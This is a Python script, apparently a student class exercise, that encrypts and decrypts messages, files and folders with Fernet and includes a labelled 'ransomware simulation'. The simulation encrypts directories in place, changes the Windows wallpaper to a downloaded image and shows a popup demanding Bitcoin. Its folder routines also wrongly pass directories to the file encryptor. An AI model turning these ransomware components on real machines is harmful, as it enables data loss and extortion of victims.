#!/bin/python3
#Class 8 Python Script
#DJ Choi
#4/13/2022
#Writing python script to encrypt and decrypt a message and file. 

#import libraries
from cryptography.fernet import Fernet
import os
import os.path
import ctypes
import urllib.request


#declare functions
#generates key and save it to a file
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

#load key
def load_key():
    return open("key.key", "rb").read()

#menu
def menu():
    choice = input("Options:\n[1] Encrypt a file\n[2] Decrypt a file\n[3] Encrypt a message\n[4] Decrypt a message\n[5] Encrypt a folder and all its contents\n[6] Decrypt a folder and all its contents\n[7] Ransomware simulation\nEnter a number: ")

    if choice == '1':  
        filename = input("Enter filepath: ")
        encrypt_file(filename)

    elif choice == '2':
        filename = input("Enter filepath: ")
        decrypt_file(filename)

    elif choice == '3':
        message = input("Enter message: ")
        encrypt_message(message.encode())

    elif choice == '4':
        message = input("Enter message: ")
        decrypt_message(message.encode())

    elif choice == '5':
        folder = input("Enter foler path: ")
        encrypt_dir(folder)

    elif choice == '6':
        folder = input("Enter folder path: ")
        decrypt_dir(folder)

    elif choice == '7':
        change_desktop_background()
        popup()
        
    else:
        print("Invalid choice. Please try again.")

#writing key if it doesn't exist and load key
def key_check():
    if os.path.isfile("./key.key"):
        key = load_key()
    else:
        write_key()
        key = load_key()
    global f
    f = Fernet(key)

#messagebox popup
def popup():
    MessageBox = ctypes.windll.user32.MessageBoxW  
    MessageBox(None, 'Your files have been encrypted and are no longer accessible. There is no way to restore your data without a special key. Send BTC to Key@RW.com for special key', 'Ransomeware', 0)

#encrypt a message
def encrypt_message(message):
    key_check()
    encrypted = f.encrypt(message)
    print("Ciphertext is "+encrypted.decode('utf-8'))

#decrypt a message
def decrypt_message(message):
    key_check()
    decrypted = f.decrypt(message)
    print("Plaintext is "+str(decrypted.decode('utf-8')))

#change desktop background
def change_desktop_background():
    user = os.path.expanduser('~')
    imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
    # Go to specif url and download+save image using absolute path
    path = f'{user}/Desktop/pic.jpg'
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

#encrypt file
def encrypt_file(filename):
    key_check()
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)
    print("File encrypted")

#decrypt file
def decrypt_file(filename):
    key_check()
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)
    print("File Decrypted")

#encrypt directory and contents
def encrypt_dir(folder):
    for root, dirs, files in os.walk(folder, topdown=False):
        for name in files:
            file_path = (os.path.join(root, name))
            print(file_path)
            encrypt_file(file_path)
        for name in dirs:
            file_path = (os.path.join(root, name))
            print(file_path)
            encrypt_file(file_path)

#decrypt directory and contents
def decrypt_dir(folder):
    for root, dirs, files in os.walk(folder, topdown=False):
        for name in files:
            file_path = (os.path.join(root, name))
            print(file_path)
            decrypt_file(file_path)
        for name in dirs:
            file_path = (os.path.join(root, name))
            print(file_path)
            decrypt_file(file_path)

# Main

menu()

#end